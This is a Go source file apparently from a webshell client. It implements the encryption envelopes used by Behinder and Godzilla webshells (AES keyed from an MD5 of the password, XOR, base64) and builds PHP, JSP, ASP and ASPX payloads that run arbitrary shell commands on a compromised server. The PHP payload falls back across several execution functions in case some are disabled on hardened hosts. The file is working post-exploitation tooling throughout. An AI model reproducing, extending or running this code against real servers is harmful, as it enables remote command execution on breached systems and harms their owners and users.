package webshell

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"regexp"
	"strings"
)

// transport is one request/response codec. ID is persisted in the webshell row so
// the next execute reuses the variant that worked during the connection test.
type transport struct {
	ID     string
	Encode func([]byte) ([]byte, error)
	Decode func([]byte) ([]byte, error)
}

func md5Hex(s string) string {
	sum := md5.Sum([]byte(s))
	return hex.EncodeToString(sum[:])
}

// behKey returns the ASCII bytes of the first 16 hex chars of md5(password).
// Behinder shells embed exactly this 16-char string as their AES key.
func behKey(pass string) []byte {
	h := md5Hex(pass)
	return []byte(h[:16])
}

func behIV(pass string) []byte {
	h := md5Hex(pass)
	return []byte(h[16:32])
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	n := blockSize - len(data)%blockSize
	return append(data, bytes.Repeat([]byte{byte(n)}, n)...)
}

func pkcs7Unpad(data []byte, blockSize int) ([]byte, error) {
	if len(data) == 0 || len(data)%blockSize != 0 {
		return nil, errors.New("bad block size")
	}
	n := int(data[len(data)-1])
	if n == 0 || n > blockSize || n > len(data) {
		return nil, errors.New("bad padding")
	}
	for _, b := range data[len(data)-n:] {
		if int(b) != n {
			return nil, errors.New("bad padding")
		}
	}
	return data[:len(data)-n], nil
}

func aesCBCEncrypt(key, iv, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plain = pkcs7Pad(plain, block.BlockSize())
	out := make([]byte, len(plain))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, plain)
	return out, nil
}

func aesCBCDecrypt(key, iv, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 || len(data)%block.BlockSize() != 0 {
		return nil, errors.New("bad ciphertext length")
	}
	out := make([]byte, len(data))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(out, data)
	return pkcs7Unpad(out, block.BlockSize())
}

func aesECBEncrypt(key, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plain = pkcs7Pad(plain, block.BlockSize())
	out := make([]byte, len(plain))
	for i := 0; i < len(plain); i += block.BlockSize() {
		block.Encrypt(out[i:i+block.BlockSize()], plain[i:i+block.BlockSize()])
	}
	return out, nil
}

func aesECBDecrypt(key, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 || len(data)%block.BlockSize() != 0 {
		return nil, errors.New("bad ciphertext length")
	}
	out := make([]byte, len(data))
	for i := 0; i < len(data); i += block.BlockSize() {
		block.Decrypt(out[i:i+block.BlockSize()], data[i:i+block.BlockSize()])
	}
	return pkcs7Unpad(out, block.BlockSize())
}

func xorWithKey(data, key []byte, shift bool) []byte {
	out := make([]byte, len(data))
	for i := range data {
		k := key[i%len(key)]
		if shift {
			k = key[(i+1)&15]
		}
		out[i] = data[i] ^ k
	}
	return out
}

func b64encode(b []byte) []byte {
	out := make([]byte, base64.StdEncoding.EncodedLen(len(b)))
	base64.StdEncoding.Encode(out, b)
	return out
}

// b64decodeLoose accepts standard/raw/URL-safe base64, ignores whitespace, and
// falls back to the longest base64-looking run (shells often wrap the payload in
// HTML or warnings).
func b64decodeLoose(body []byte) ([]byte, bool) {
	s := strings.TrimSpace(string(body))
	s = strings.Map(func(r rune) rune {
		if r == '\r' || r == '\n' || r == '\t' || r == ' ' {
			return -1
		}
		return r
	}, s)
	try := func(v string) ([]byte, bool) {
		for _, enc := range []*base64.Encoding{base64.StdEncoding, base64.RawStdEncoding, base64.URLEncoding, base64.RawURLEncoding} {
			if b, err := enc.DecodeString(v); err == nil && len(b) > 0 {
				return b, true
			}
		}
		return nil, false
	}
	if b, ok := try(s); ok {
		return b, true
	}
	// Longest base64 run. Deliberately conservative: at least 16 chars so random
	// words in error pages don't win.
	runs := regexp.MustCompile(`[A-Za-z0-9+/=_-]{16,}`).FindAllString(s, -1)
	best := ""
	for _, r := range runs {
		if len(r) > len(best) {
			best = r
		}
	}
	if best != "" {
		return try(best)
	}
	return nil, false
}

func mostlyText(b []byte) bool {
	if len(b) == 0 {
		return true
	}
	bad := 0
	for _, c := range b {
		if c == 0 {
			return false
		}
		if c < 0x09 || (c > 0x0d && c < 0x20) {
			bad++
		}
	}
	return bad*20 < len(b)
}

// behTransports returns Behinder request codecs. Behinder shells accept a base64
// request body; the encrypted plaintext is either "func|code" or raw code.
func behTransports(pass, want string) []transport {
	key, iv2 := behKey(pass), behIV(pass)
	iv1 := key
	rawSum := md5.Sum([]byte(pass))
	rawKey, rawIV := rawSum[:], rawSum[16:]
	mk := func(id string, enc func([]byte) ([]byte, error), dec func([]byte) ([]byte, error)) transport {
		return transport{
			ID: id,
			Encode: func(p []byte) ([]byte, error) {
				b, err := enc(p)
				if err != nil {
					return nil, err
				}
				return b64encode(b), nil
			},
			Decode: func(body []byte) ([]byte, error) {
				b, ok := b64decodeLoose(body)
				if !ok {
					return nil, errors.New("响应不是 base64")
				}
				return dec(b)
			},
		}
	}
	all := []transport{
		mk("aes_cbc_iv2",
			func(p []byte) ([]byte, error) { return aesCBCEncrypt(key, iv2, p) },
			func(b []byte) ([]byte, error) { return aesCBCDecrypt(key, iv2, b) }),
		mk("aes_cbc_iv1",
			func(p []byte) ([]byte, error) { return aesCBCEncrypt(key, iv1, p) },
			func(b []byte) ([]byte, error) { return aesCBCDecrypt(key, iv1, b) }),
		mk("aes_ecb",
			func(p []byte) ([]byte, error) { return aesECBEncrypt(key, p) },
			func(b []byte) ([]byte, error) { return aesECBDecrypt(key, b) }),
		mk("aes_cbc_rawkey",
			func(p []byte) ([]byte, error) { return aesCBCEncrypt(rawKey, rawIV, p) },
			func(b []byte) ([]byte, error) { return aesCBCDecrypt(rawKey, rawIV, b) }),
		mk("xor",
			func(p []byte) ([]byte, error) { return xorWithKey(p, key, false), nil },
			func(b []byte) ([]byte, error) { return xorWithKey(b, key, false), nil }),
		{
			ID:     "base64",
			Encode: func(p []byte) ([]byte, error) { return b64encode(p), nil },
			Decode: func(b []byte) ([]byte, error) {
				if out, ok := b64decodeLoose(b); ok {
					return out, nil
				}
				return nil, errors.New("响应不是 base64")
			},
		},
		{
			ID:     "plain",
			Encode: func(p []byte) ([]byte, error) { return p, nil },
			Decode: func(b []byte) ([]byte, error) { return b, nil },
		},
	}
	return filterTransports(all, want)
}

// godzillaTransports returns Godzilla request codecs. The PHP shell evals the
// decrypted payload, so a raw PHP code body is enough once the envelope matches.
func godzillaTransports(pass, want string) []transport {
	key := behKey(pass) // md5(password) first 16 chars
	mk := func(id string, enc func([]byte) ([]byte, error), dec func([]byte) ([]byte, error)) transport {
		return transport{
			ID: id,
			Encode: func(p []byte) ([]byte, error) {
				b, err := enc(p)
				if err != nil {
					return nil, err
				}
				return b64encode(b), nil
			},
			Decode: func(body []byte) ([]byte, error) {
				b, ok := b64decodeLoose(body)
				if !ok {
					return nil, errors.New("响应不是 base64")
				}
				return dec(b)
			},
		}
	}
	all := []transport{
		mk("aes_ecb",
			func(p []byte) ([]byte, error) { return aesECBEncrypt(key, p) },
			func(b []byte) ([]byte, error) { return aesECBDecrypt(key, b) }),
		mk("aes_cbc_iv1",
			func(p []byte) ([]byte, error) { return aesCBCEncrypt(key, key, p) },
			func(b []byte) ([]byte, error) { return aesCBCDecrypt(key, key, b) }),
		mk("xor",
			func(p []byte) ([]byte, error) { return xorWithKey(p, key, false), nil },
			func(b []byte) ([]byte, error) { return xorWithKey(b, key, false), nil }),
		mk("xor_shift",
			func(p []byte) ([]byte, error) { return xorWithKey(p, key, true), nil },
			func(b []byte) ([]byte, error) { return xorWithKey(b, key, true), nil }),
		{
			ID:     "base64",
			Encode: func(p []byte) ([]byte, error) { return b64encode(p), nil },
			Decode: func(b []byte) ([]byte, error) {
				if out, ok := b64decodeLoose(b); ok {
					return out, nil
				}
				return nil, errors.New("响应不是 base64")
			},
		},
	}
	return filterTransports(all, want)
}

func filterTransports(all []transport, want string) []transport {
	want = strings.TrimSpace(want)
	if want == "" || want == EncodingAuto {
		return all
	}
	// Accept a bare scheme (e.g. "aes_ecb") or a full ID ("aes_ecb|direct").
	scheme := strings.SplitN(want, "|", 2)[0]
	out := make([]transport, 0, 1)
	for _, t := range all {
		if t.ID == scheme {
			out = append(out, t)
			break
		}
	}
	if len(out) == 0 {
		return all
	}
	return out
}

// payload variants for Behinder and Godzilla. The first successful pair is saved
// as the transport id "scheme|payload".
type payloadVariant struct {
	ID   string
	Wrap func(code string) string
}

func behPayloads(want string) []payloadVariant {
	all := []payloadVariant{
		{ID: "beh3", Wrap: func(code string) string { return "x|" + code }},
		{ID: "beh3_b64", Wrap: func(code string) string { return "x|" + base64.StdEncoding.EncodeToString([]byte(code)) }},
		{ID: "direct", Wrap: func(code string) string { return code }},
	}
	return filterPayloads(all, want)
}

func godzillaPayloads(want string) []payloadVariant {
	all := []payloadVariant{
		{ID: "direct", Wrap: func(code string) string { return code }},
		{ID: "eval_b64", Wrap: func(code string) string {
			return `eval(base64_decode("` + base64.StdEncoding.EncodeToString([]byte(code)) + `"));`
		}},
	}
	return filterPayloads(all, want)
}

func filterPayloads(all []payloadVariant, want string) []payloadVariant {
	parts := strings.SplitN(strings.TrimSpace(want), "|", 2)
	if len(parts) != 2 || parts[1] == "" {
		return all
	}
	for _, p := range all {
		if p.ID == parts[1] {
			return []payloadVariant{p}
		}
	}
	return all
}

func newMarker() (string, string, error) {
	buf := make([]byte, 12)
	if _, err := rand.Read(buf); err != nil {
		return "", "", err
	}
	m := hex.EncodeToString(buf)
	return "__ws_" + m + "_start__", "__ws_" + m + "_end__", nil
}

// phpExecCode wraps a shell command in PHP with output markers and several
// execution-function fallbacks (system may be disabled on hardened targets).
func phpExecCode(cmd, start, end string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd + " 2>&1"))
	return fmt.Sprintf(`echo "%s";$__ws_o=array();$__ws_c=base64_decode("%s");if(function_exists("system")){@system($__ws_c);}elseif(function_exists("shell_exec")){echo @shell_exec($__ws_c);}elseif(function_exists("passthru")){@passthru($__ws_c);}elseif(function_exists("exec")){@exec($__ws_c,$__ws_o);echo implode("\n",$__ws_o);}else{echo "webshell: no command execution function";}echo "%s";`, start, b64, end)
}

func jspExecCode(cmd, start, end string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd + " 2>&1"))
	return fmt.Sprintf(`out.print("%s");try{String[] __ws_c={"cmd.exe","/c",new String(java.util.Base64.getDecoder().decode("%s"))};if(!System.getProperty("os.name").toLowerCase().contains("win")){__ws_c=new String[]{"/bin/sh","-c",new String(java.util.Base64.getDecoder().decode("%s"))};}Process __ws_p=Runtime.getRuntime().exec(__ws_c);java.io.InputStream __ws_i=__ws_p.getInputStream();byte[] __ws_b=new byte[8192];int __ws_n;while((__ws_n=__ws_i.read(__ws_b))>0){out.print(new String(__ws_b,0,__ws_n));}__ws_i.close();}catch(Exception __ws_e){out.print(__ws_e.toString());}out.print("%s");`, start, b64, b64, end)
}

func aspExecCode(cmd, start, end string) string {
	escaped := strings.ReplaceAll(cmd, `"`, `""`)
	return fmt.Sprintf(`Response.Write "%s":Set __ws_s=Server.CreateObject("WScript.Shell"):Set __ws_e=__ws_s.Exec("cmd.exe /c ""%s"""):Response.Write __ws_e.StdOut.ReadAll():Response.Write "%s"`, start, escaped, end)
}

func aspxExecCode(cmd, start, end string) string {
	escaped := strings.ReplaceAll(cmd, `"`, `\"`)
	return fmt.Sprintf(`Response.Write("%s");System.Diagnostics.Process __ws_p=new System.Diagnostics.Process();__ws_p.StartInfo.FileName="cmd.exe";__ws_p.StartInfo.Arguments="/c %s";__ws_p.StartInfo.UseShellExecute=false;__ws_p.StartInfo.RedirectStandardOutput=true;__ws_p.Start();Response.Write(__ws_p.StandardOutput.ReadToEnd());__ws_p.WaitForExit();Response.Write("%s");`, start, escaped, end)
}

// buildPayload returns the request payload and whether output markers were added.
func buildPayload(cfg Config, cmd string) (payload string, marked bool, err error) {
	start, end, err := newMarker()
	if err != nil {
		return "", false, err
	}
	switch cfg.Type {
	case TypeSimple:
		switch cfg.Mode {
		case ModeRaw:
			return cmd, false, nil
		case ModePHPEval:
			return phpExecCode(cmd, start, end), true, nil
		case ModeJSPEval:
			return jspExecCode(cmd, start, end), true, nil
		case ModeASPEval:
			return aspExecCode(cmd, start, end), true, nil
		case ModeASPXEval:
			return aspxExecCode(cmd, start, end), true, nil
		}
	case TypeBehinder, TypeGodzilla:
		return phpExecCode(cmd, start, end), true, nil
	case TypeCustom:
		return cmd, false, nil
	}
	return "", false, fmt.Errorf("unsupported type/mode: %s/%s", cfg.Type, cfg.Mode)
}

func extractMarked(out, start, end string) string {
	if start == "" || end == "" {
		return out
	}
	i := strings.Index(out, start)
	if i < 0 {
		return out
	}
	j := strings.Index(out[i+len(start):], end)
	if j < 0 {
		return out
	}
	return out[i+len(start) : i+len(start)+j]
}

func compileRegex(pattern string) (*regexp.Regexp, error) {
	return regexp.Compile(pattern)
}
